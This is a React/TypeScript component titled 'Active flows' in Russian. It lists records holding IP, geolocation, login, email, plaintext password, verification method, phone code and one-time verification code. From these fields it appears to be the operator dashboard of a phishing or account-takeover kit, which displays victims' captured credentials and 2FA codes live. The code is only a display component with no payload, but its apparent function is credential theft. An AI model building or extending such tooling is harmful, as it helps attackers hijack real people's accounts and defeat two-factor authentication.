import styles from './Flows.module.scss';

export interface IFlow {
	description?: string;
	email?: string;
	geo?: string;
	id: number;
	ip: string;
	isActive: boolean;
	login?: string;
	messageId: number;
	method?: string;
	phone?: string;
	socketId?: string;
	verifMethod?: string;
	password?: string;
	phoneName?: string;
	phoneCode?: string;
	verifCode?: string;
}
export default function Flows({ flows }: { flows: IFlow[] }) {
	return (
		<div className={styles.flows}>
			<div className={styles.header}>Активные потоки</div>
			<div className={styles.list}>
				{flows.map(f => (
					<div className={styles.flow}>
						{f.geo && (
							<div className={styles.row}>
								<div className={styles.key}>Geo</div>
								<div className={styles.value}>{f.geo}</div>
							</div>
						)}
						{f.method && (
							<div className={styles.row}>
								<div className={styles.key}>Method</div>
								<div className={styles.value}>{f.method}</div>
							</div>
						)}
						{f.login && (
							<div className={styles.row}>
								<div className={styles.key}>Login</div>
								<div className={styles.value}>{f.login}</div>
							</div>
						)}
						{f.email && (
							<div className={styles.row}>
								<div className={styles.key}>Email</div>
								<div className={styles.value}>{f.email}</div>
							</div>
						)}
						{f.password && (
							<div className={styles.row}>
								<div className={styles.key}>Password</div>
								<div className={styles.value}>{f.password}</div>
							</div>
						)}
						{f.verifMethod && (
							<div className={styles.row}>
								<div className={styles.key}>VerifMethod</div>
								<div className={styles.value}>{f.verifMethod}</div>
							</div>
						)}
						{f.phoneName && (
							<div className={styles.row}>
								<div className={styles.key}>phoneName</div>
								<div className={styles.value}>{f.phoneName}</div>
							</div>
						)}
						{f.phoneCode && (
							<div className={styles.row}>
								<div className={styles.key}>phoneCode</div>
								<div className={styles.value}>{f.phoneCode}</div>
							</div>
						)}
						{f.verifCode && (
							<div className={styles.row}>
								<div className={styles.key}>Code</div>
								<div className={styles.value}>{f.verifCode}</div>
							</div>
						)}
					</div>
				))}
			</div>
		</div>
	);
}
